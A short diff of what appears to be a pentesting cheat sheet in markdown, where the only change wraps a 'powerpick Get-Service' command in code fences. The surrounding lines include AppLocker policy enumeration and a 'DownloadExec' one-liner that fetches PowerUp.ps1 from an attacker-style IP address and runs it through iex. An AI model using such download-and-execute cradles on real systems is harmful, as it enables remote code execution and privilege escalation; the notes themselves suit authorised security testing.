@@ -80,8 +80,9 @@ Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 ```
 
 ## From service name to display name
+```
 powerpick Get-Service –Name "MSSQL*"
-
+```
 ## DownloadExec
 ```
 ((New-Object Net.WebClient).DownloadString('http://10.10.16.29:8080/PowerUp.ps1')) | iex 
